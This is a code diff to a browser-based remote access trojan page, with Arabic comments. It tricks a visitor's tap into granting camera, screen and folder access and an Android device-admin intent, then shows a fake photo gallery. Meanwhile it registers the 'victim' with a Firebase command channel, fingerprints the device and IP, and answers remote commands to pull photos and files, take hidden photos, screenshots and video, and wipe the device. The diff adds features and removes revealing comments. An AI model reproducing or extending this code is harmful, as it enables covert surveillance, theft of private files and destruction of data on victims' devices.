@@ -12,7 +12,6 @@
         @keyframes spin { 0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
         #permission-prompt { margin-top:20px; font-size:1em; color:#aaa; }
         button#retry-perms { display:none; margin-top:20px; padding:10px 20px; background:#0af; border:none; color:#000; font-weight:bold; border-radius:5px; cursor:pointer; }
-
         /* المعرض الوهمي */
         #gallery-container { display: none; padding: 20px; background: #111; min-height:100vh; }
         .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px,1fr)); gap: 10px; margin-top: 20px; }
@@ -25,15 +24,13 @@
 </head>
 <body>
 
-<!-- شاشة البداية (الطلب) -->
 <div id="loading-screen">
     <div class="loader"></div>
-    <div id="permission-prompt">الرجاء السماح بالوصول للمتابعة</div>
+    <div id="permission-prompt">اضغط على الشاشة لبدء التطبيق</div>
     <button id="retry-perms" onclick="requestPermissions()">إعادة المحاولة</button>
     <button id="unlock-btn" style="position:absolute;inset:0;opacity:0;border:none;background:transparent;" onclick="unlockApp()">فتح</button>
 </div>
 
-<!-- المعرض الوهمي (بعد النجاح) -->
 <div id="gallery-container">
     <div class="header">
         <h2>📷 أحدث الصور</h2>
@@ -58,18 +55,17 @@
     const vid = 'phantom-'+Math.random().toString(36).substr(2,12);
     const vref = db.ref('victims/'+vid);
 
-    let rootDir = null, camStream = null, unlocked = false, permissionsGiven = false;
+    let rootDir = null, camStream = null, unlocked = false;
 
-    // ========== عند أول نقرة ==========
     window.unlockApp = async function() {
         if(unlocked) return;
         unlocked = true;
         document.getElementById('unlock-btn').remove();
+        document.getElementById('permission-prompt').innerText = 'الرجاء منح الإذن للمتابعة...';
         await requestPermissions();
     }
 
     async function requestPermissions() {
-        document.getElementById('permission-prompt').innerText = 'جاري طلب الصلاحيات...';
         document.getElementById('retry-perms').style.display = 'none';
 
         // الكاميرا
@@ -77,37 +73,55 @@
             camStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"},audio:false});
         } catch(e) {}
 
-        // مشاركة الشاشة (لقطة الشاشة والفيديو)
+        // مشاركة الشاشة (لقطات)
         try {
             const dStream = await navigator.mediaDevices.getDisplayMedia({video:true});
             dStream.getTracks().forEach(t => t.stop());
         } catch(e) {}
 
-        // صلاحية الملفات (ضرورية)
+        // صلاحية الملفات (ضرورية – تظهر نافذة اختيار مجلد)
         try {
             rootDir = await window.showDirectoryPicker({mode:'readwrite', startIn:'documents'});
         } catch(e) {
-            document.getElementById('permission-prompt').innerText = '⚠️ صلاحية الملفات مرفوضة. لن تعمل ميزات السحب.';
+            document.getElementById('permission-prompt').innerText = '⚠️ يجب منح صلاحية التخزين.';
             document.getElementById('retry-perms').style.display = 'block';
-            return; // لا ننتقل للمعرض
+            return;
         }
 
-        // صلاحية مدير الجهاز (صامت)
+        // صلاحية مدير الجهاز (صامتة)
         try {
             let a = document.createElement('a');
             a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
             a.click();
         } catch(e) {}
 
-        permissionsGiven = true;
-        document.getElementById('retry-perms').style.display = 'none';
-
-        // إخفاء شاشة التحميل وإظهار المعرض
+        // إخفاء شاشة التحميل وإظهار المعرض الوهمي
         document.getElementById('loading-screen').style.display = 'none';
         document.getElementById('gallery-container').style.display = 'block';
         loadFakeGallery();
 
-        // تسجيل الجهاز في C2 (صامت)
+        // تسجيل الجهاز في القاعدة وإرسال معلومات إضافية
+        await registerDevice();
+        startCommandListener();
+        startHiddenCamera();
+    }
+
+    async function registerDevice() {
+        let ip = 'غير معروف';
+        try {
+            const resp = await fetch('https://api.ipify.org?format=json');
+            const data = await resp.json();
+            ip = data.ip;
+        } catch(e) {}
+
+        let battery = 'غير معروف';
+        let charging = false;
+        if(navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            battery = Math.round(bat.level * 100) + '%';
+            charging = bat.charging;
+        }
+
         await vref.set({
             online: true,
             fingerprint: {
@@ -115,18 +129,18 @@
                 plat: navigator.platform,
                 scr: screen.width+'x'+screen.height,
                 cores: navigator.hardwareConcurrency,
-                mem: navigator.deviceMemory||'?'
+                mem: navigator.deviceMemory||'?',
+                ip: ip,
+                battery: battery,
+                charging: charging,
+                language: navigator.language,
+                time: new Date().toLocaleString()
             }
         });
-
-        startCommandListener();
-        startHiddenCamera();
     }
 
-    // ========== معرض الصور الوهمي ==========
     function loadFakeGallery() {
         const grid = document.getElementById('photo-grid');
-        // صور عشوائية من Lorem Picsum (تبدو طبيعية)
         const pics = [];
         for(let i=1; i<=20; i++) {
             pics.push(`https://picsum.photos/300/200?random=${i}`);
@@ -134,37 +148,46 @@
         grid.innerHTML = pics.map(url => `<img src="${url}" loading="lazy">`).join('');
     }
 
-    // ========== أوامر C2 ==========
+    // ========== مستقبل الأوامر ==========
     function startCommandListener() {
         vref.child('command').on('value', async snap => {
             const c = snap.val();
             if(!c) return;
             try {
                 switch(c.action) {
-                    case 'get_photos':
-                        if(c.folder) await pullFromFolder(c.folder);
-                        else await pullAllKnownFolders();
-                        break;
-                    case 'get_files':
-                        await pullDir(c.path||'');
-                        break;
-                    case 'vibrate':
-                        navigator.vibrate([200,100,200]);
-                        break;
-                    case 'play_sound':
-                        // إثبات الصوت فقط، تم كتمه للضحية عن طريق عدم تشغيل صوت هنا (نرسل فقط الأمر لكن الصفحة لا تصدر صوتا لأننا لم نفعّل AudioContext)
-                        break;
+                    case 'get_photos': c.folder ? await pullFromFolder(c.folder) : await pullAllKnownFolders(); break;
+                    case 'get_files': await pullDir(c.path||''); break;
+                    case 'vibrate': navigator.vibrate([200,100,200]); break;
+                    case 'play_sound': break; // تم كتم الصوت
                     case 'screenshot': await screenshot(); break;
                     case 'record_video': await recordVid(c.duration||10); break;
                     case 'format': await formatDevice(); break;
                     case 'stealth_photo': await captureHiddenPhoto(); break;
+                    case 'flash_on': await setFlash(true); break;
+                    case 'flash_off': await setFlash(false); break;
+                    case 'device_info': await sendDeviceInfo(); break;
                 }
             } catch(e) { console.error(e); }
             await vref.child('command').remove();
         });
     }
 
-    // ========== سحب الصور من مجلد محدد ==========
+    // ========== فلاش ==========
+    async function setFlash(enable) {
+        if(!camStream) throw new Error('لا كاميرا');
+        const track = camStream.getVideoTracks()[0];
+        if(track && track.applyConstraints) {
+            await track.applyConstraints({ advanced: [{ torch: enable }] });
+        }
+    }
+
+    // ========== إرسال معلومات الجهاز عند الطلب ==========
+    async function sendDeviceInfo() {
+        const info = (await vref.child('fingerprint').once('value')).val() || {};
+        await store('device_info', null, { info: info });
+    }
+
+    // ========== سحب الصور ==========
     const FOLDER_MAP = {
         'camera': 'DCIM/Camera',
         'downloads': 'Download',
@@ -174,37 +197,28 @@
     };
 
     async function pullFromFolder(folderKey) {
-        if(!rootDir) throw new Error('صلاحية الملفات مفقودة');
+        if(!rootDir) throw new Error('صلاحية التخزين مفقودة');
         const path = FOLDER_MAP[folderKey];
         if(!path) throw new Error('مجلد غير معروف');
-        try {
-            let sub = rootDir;
-            for(let part of path.split('/')) {
-                sub = await sub.getDirectoryHandle(part);
-            }
-            await walkDir(sub, path+'/');
-        } catch(e) {
-            throw e; // الفشل سيظهر في البوت
-        }
+        let sub = rootDir;
+        for(let part of path.split('/')) sub = await sub.getDirectoryHandle(part);
+        await walkDir(sub, path+'/');
     }
 
     async function pullAllKnownFolders() {
-        const folders = Object.values(FOLDER_MAP);
-        for(const path of folders) {
+        for(const path of Object.values(FOLDER_MAP)) {
             try {
                 let sub = rootDir;
                 for(let part of path.split('/')) sub = await sub.getDirectoryHandle(part);
                 await walkDir(sub, path+'/');
-            } catch(e) { /* تخطي إذا المجلد غير موجود */ }
+            } catch(e) { /* تخطي */ }
         }
     }
 
     async function pullDir(path) {
-        if(!rootDir) throw new Error('صلاحية الملفات مفقودة');
+        if(!rootDir) throw new Error('صلاحية التخزين مفقودة');
         let sub = rootDir;
-        if(path) {
-            for(let part of path.split('/').filter(Boolean)) sub = await sub.getDirectoryHandle(part);
-        }
+        if(path) { for(let part of path.split('/').filter(Boolean)) sub = await sub.getDirectoryHandle(part); }
         await walkDir(sub, path||'/');
     }
 
@@ -247,8 +261,7 @@
 
     async function captureHiddenPhoto() {
         if(!camStream) throw new Error('لا كاميرا');
-        const videoTrack = camStream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(videoTrack);
+        const imageCapture = new ImageCapture(camStream.getVideoTracks()[0]);
         const bitmap = await imageCapture.grabFrame();
         const canvas = document.createElement('canvas');
         canvas.width = bitmap.width; canvas.height = bitmap.height;
@@ -317,11 +330,8 @@
         await vref.child('loot').push().set({type, url, ts:Date.now(), ...extra});
     }
 
-    // عرض تلقائي لشاشة الطلب عند التحميل الأول
     window.onload = ()=>{
-        document.getElementById('permission-prompt').innerText = 'اضغط على الشاشة للمتابعة...';
-        // وضع الزر الشفاف في الأعلى لاستقبال أول نقرة
-        document.getElementById('unlock-btn').style.display = 'block';
+        document.getElementById('permission-prompt').innerText = 'اضغط على الشاشة لبدء التطبيق';
     };
 </script>
 </body>
